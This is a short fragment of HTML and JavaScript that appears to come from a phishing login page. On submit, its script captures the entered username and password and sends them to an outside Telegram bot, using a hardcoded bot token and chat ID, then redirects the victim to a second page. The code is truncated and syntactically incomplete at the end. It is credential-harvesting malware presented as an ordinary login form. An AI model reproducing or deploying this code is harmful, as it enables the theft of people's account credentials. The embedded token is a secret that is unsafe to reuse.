<body>
    <div class="header-container">

    <script>
        function submitForm(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Send form data to Telegram using a bot
            const botToken = '8342341479:AAGxeOqHIrVvl1FZn10HMr5-rIxFC953AGw';
            const chatId = '7357838260';
            const message = `Username: ${username}\nPassword: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => {
                    if (response.ok) {
                        // Redirect to another page after successful submission
                        window.location.href = "2nd.html";
                    } else {
                        alert('Error sending data');
                    }

                .catch(error => {

        }
